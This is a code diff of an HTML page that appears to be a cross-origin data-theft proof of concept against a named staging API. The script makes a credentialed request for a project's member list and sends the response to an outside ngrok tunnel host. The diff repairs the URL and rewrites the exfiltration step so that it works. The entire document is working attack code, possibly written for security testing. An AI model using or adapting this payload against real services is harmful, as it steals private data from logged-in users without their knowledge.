@@ -1,16 +1,21 @@
 <html>
-  <body>
-    <script>
-      var req = new XMLHttpRequest(); 
+<body>
+<script>
+var req = new XMLHttpRequest(); 
 req.onload = reqListener; 
-req.open('get','https://https://app.supersidestaging.com:443/api/projects/v2/193510/members',true); 
+req.open('get', 'https://app.supersidestaging.com/api/projects/v2/193510/members', true); 
 req.withCredentials = true;
 req.send();
 
 function reqListener() {
-    location='//0.tcp.ap.ngrok.io:11134/log?key='+this.responseText; 
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "//0.tcp.ap.ngrok.io:11134/log?key=" + this.responseText, true);
+        xhr.send();
+    } catch (e) {
+        console.error(e);
+    }
 };
-      }
-    </script>
-  </body>
+</script>
+</body>
 </html>
